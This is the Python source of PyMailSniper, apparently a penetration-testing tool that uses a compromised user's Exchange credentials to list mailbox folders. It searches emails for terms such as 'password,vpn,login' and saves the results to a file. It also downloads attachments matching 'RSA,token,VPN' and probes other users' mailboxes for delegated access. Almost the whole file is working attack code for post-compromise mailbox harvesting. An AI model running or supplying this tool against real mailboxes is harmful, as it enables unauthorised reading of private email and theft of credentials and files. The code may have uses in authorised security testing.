#!/usr/bin/env python3

from exchangelib import Account, Credentials, Configuration, DELEGATE, Folder, FileAttachment
from exchangelib.errors import UnauthorizedError, CASError
import requests
import argparse
import sys
import logging
import os
from os.path import isfile


def loggerCreate(params):
    logger = logging.getLogger('pymailsniper')
    logger.setLevel(logging.DEBUG)

    # Output response to a File
    filename = logging.FileHandler(params.get("output"))
    filename.setLevel(logging.DEBUG)
    logger.addHandler(filename)

    # Output response to Screen
    screenOutput = logging.StreamHandler(sys.stdout)
    screenOutput.setLevel(logging.DEBUG)
    logger.addHandler(screenOutput)

    return logger

# Function to setup an Exchangelib Account object to be used throughout the code
def acctSetup(params):

    server = params.get('server')
    email = params.get('email')
    password = params.get('password')
    shared = params.get('delegated')

    try:
        config = Configuration(
            server=server, credentials=Credentials(email, password))

        if params.get('delegated'):
            account = Account(primary_smtp_address=shared,
                            autodiscover=False, config=config, access_type=DELEGATE)
        else:
            account = Account(primary_smtp_address=email,
                            autodiscover=False, config=config, access_type=DELEGATE)

        return account
    except Exception as e:
        print(e)

# List folders from a users inbox
def folderList(accountObject):

    folder = accountObject.root/'Top of Information Store'

    print('[+] Folder List for Compromised Users' + '\n')
    for folders in folder.walk():
        print(folders.name)

# Search users email for specified terms
def searchEmail(accountObject, params, loghandle):

    folder = params.get("folder")
    terms = params.get("terms")
    count = params.get("count")
    if len(terms) > 1:
        termList = terms.split(',')
    else:
        termList = terms

    if params.get("delegated"):
        searchFolder = accountObject.inbox
    else:
        searchFolder = accountObject.root/'Top of Information Store'/folder
    if params.get("field") == 'body':
        print(
            '[+] Searching Email body for {} in {} Folder [+]'.format(terms, folder) + '\n')
        for term in termList:
            searchResult = searchFolder.filter(body__contains=term)[:count]
    else:
        print(
            '[+] Searching Email Subject for {} in {} Folder [+]'.format(terms, folder) + '\n')
        for term in termList:
            searchResult = searchFolder.filter(subject__contains=term)[:count]

    for emails in searchResult:
        loghandle.debug('''
From: {}
Date: {}
Subject: {}
Body: {}
*************************************************************************************************{}'''.format(emails.author.email_address, emails.datetime_received,emails.subject, emails.text_body, '\n'))

# Search for attachments based on search terms provided
def searchAttachments(accountObject, params):

    folder = params.get("folder")
    terms = params.get("terms")
    count = params.get("count")
    if len(terms) > 1:
        termList = terms.split(',')
    else:
        termList = terms

    if params.get("delegated"):
        searchFolder = accountObject.inbox
    else:
        searchFolder = accountObject.root/'Top of Information Store'/folder
    if params.get("field") == 'body':
        for term in termList:
            searchResult = searchFolder.filter(body__contains=term)[:count]
    else:
        for term in termList:
            searchResult = searchFolder.filter(subject__contains=term)[:count]

    print('[+] Attachment List for Compromised Users with search term {} in {} Folder'.format(terms, folder) + '\n')
    if params.get("directory"):
        print('[+] Saving Attachments [+]')
    for emails in searchResult:
        for attachment in emails.attachments:
            print('From: {} | Subject: {} | Attachment: {}'.format(
                emails.author.email_address, emails.subject, attachment.name))
            if params.get("directory"):
                if isinstance(attachment, FileAttachment):
                    local_path = os.path.join(
                        params.get("directory"), attachment.name)
                    with open(local_path, 'wb') as f, attachment.fp as fp:
                        buffer = fp.read(1024)
                        while buffer:
                            f.write(buffer)
                            buffer = fp.read(1024)
    print('\n' + 'Saved attachment to', params.get("directory"))

# Check where compromised user has delegation rights
def searchDelegates(params, fparser):

    server = params.get('server')
    email = params.get('email')
    password = params.get('password')

    if isinstance(fparser.get("galList"), (str)):
        fname = ''.join(fparser.get("galList"))
        fname = fname.split(' ')
    else:
        fname = fparser.get("galList")

    print('[+] Checking Where Compromised User Has Access' + '\n')

    for shared in fname:
        try:
            config = Configuration(
                server=server, credentials=Credentials(email, password))

            account = Account(primary_smtp_address=shared,
                          autodiscover=False, config=config, access_type=DELEGATE)

            folderInbox = account.inbox
            #print(folderInbox.permission_set)
            for s in folderInbox.permission_set.permissions:
                if s.permission_level != 'None':
                    print('User: {} has {} permissions on {}\'s Inbox'.format(email,s.permission_level,shared))

        except Exception as e:
            if 'The specified object was not found in the store., The process failed to get the correct properties' not in str(e):
                print(e)

# This is where we check if the address list file provided exists           
def file_parser(params):
	return_dict = {}

	if isfile(params.get("galList")):
		with open (params.get("galList","r")) as f:
			userfile_content = f.read().splitlines()
			f.close()
			return_dict['galList'] = userfile_content
	elif isinstance(params.get("galList"), str):
		return_dict['galList'] = params.get("galList")
	else:
		print ("GAL File not found!")

	return return_dict

def print_logo():

    logo = '''
  _____       __  __       _ _  _____       _                 
 |  __ \     |  \/  |     (_) |/ ____|     (_)                
 | |__) |   _| \  / | __ _ _| | (___  _ __  _ _ __   ___ _ __ 
 |  ___/ | | | |\/| |/ _` | | |\___ \| '_ \| | '_ \ / _ \ '__|
 | |   | |_| | |  | | (_| | | |____) | | | | | |_) |  __/ |   
 |_|    \__, |_|  |_|\__,_|_|_|_____/|_| |_|_| .__/ \___|_|   
         __/ |                               | |              
        |___/                                |_|              

                       

   '''

    print(logo)


if __name__ == "__main__":
    # This is where we start parsing arguments
    banner = "# PyMailSniper v0.2 [http://www.foofus.net] (C) sph1nx Foofus Networks <sph1nx@foofus.net>" + '\n'
    print_logo()
    print(banner)
    parser = argparse.ArgumentParser(description='Python implementation of mailsniper',
                                     usage='python3 pymailsniper.py module [options]')

    subparsers = parser.add_subparsers(
        title='Modules', dest='modules', description='available modules')

    optional_parser = argparse.ArgumentParser(add_help=False)
    optional_parser.add_argument('-s', '--remote-server', action="store",
                                 dest="server", metavar=' ', help='EWS URL for Mail Server')
    optional_parser.add_argument('-e', '--email', action="store",
                                 dest="email", metavar=' ', help='Email address of compromised user')
    optional_parser.add_argument('-p', '--password', action="store",
                                 dest="password", metavar=' ', help='Password of compromised user')

    folder_parser = subparsers.add_parser(
        'folders', help="List Mailbox Folders", parents=[optional_parser])

    attach_parser = subparsers.add_parser(
        'attachment', help="List/Download Attachments", parents=[optional_parser])
    attach_parser.add_argument('-d', '--directory', action="store",
                               dest="directory", help='Directory to download attachments', metavar=' ')
    attach_parser.add_argument('-t', '--terms', action="store",
                               dest="terms", metavar=' ', help='String to Search (Comma separated for multiple terms)', nargs='+', type=str, default='RSA,token,VPN')
    attach_parser.add_argument('-f', '--folder', action="store",
                               dest="folder", metavar=' ', help='Folder to search through', default='Inbox')
    attach_parser.add_argument('-c', '--count', action="store",
                               dest="count", metavar=' ', help='Number of emails to search', type=int, default='10')
    attach_parser.add_argument('--field', action="store",
                               dest="field", help='Email field to search. Default is subject', choices=['subject', 'body'])

    delegate_parser = subparsers.add_parser(
        'delegation', help="Find where compromised user has access", parents=[optional_parser])
    delegate_parser.add_argument('-g', '--gal', action="store",
                              dest="galList", metavar=' ', help='List of email addresses to check access', required=True)

    email_parser = subparsers.add_parser(
        'emails', help="Search for Emails", parents=[optional_parser])
    email_parser.add_argument('-f', '--folder', action="store",
                              dest="folder", metavar=' ', help='Folder to search through', default='Inbox')
    email_parser.add_argument('-t', '--terms', action="store",
                              dest="terms", metavar=' ', help='String to Search (Comma separated for multiple terms)', nargs='+', type=str, default='password,vpn,login')
    email_parser.add_argument('-c', '--count', action="store",
                              dest="count", metavar=' ', help='Number of emails to search', type=int, default='10')
    email_parser.add_argument('--field', action="store",
                              dest="field", help='Email field to search. Default is subject', choices=['subject', 'body'])
    email_parser.add_argument('--delegated', action="store",
                              dest="delegated", help='Mailbox with access')
    email_parser.add_argument('-o', '--output', action="store",
                              dest="output", metavar=' ', help='Filename to save emails', required=True)


    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()

    parsed_arguments = vars(args)  # Convert Args to a Dictionary
    if parsed_arguments.get("galList"):
        fileparser = file_parser(parsed_arguments)

    if parsed_arguments.get("output"):
        loghandle = loggerCreate(parsed_arguments)
    accountObj = acctSetup(parsed_arguments)

    if accountObj is None:
        print('[+] Could not connect to MailBox [+]')
        sys.exit()
        
    if parsed_arguments['modules'] == 'folders':
        folderList(accountObj)
    elif parsed_arguments['modules'] == 'emails':
        searchEmail(accountObj, parsed_arguments, loghandle)
    elif parsed_arguments['modules'] == 'attachment':
        searchAttachments(accountObj, parsed_arguments)
    elif parsed_arguments['modules'] == 'delegation':
        searchDelegates(parsed_arguments,fileparser)
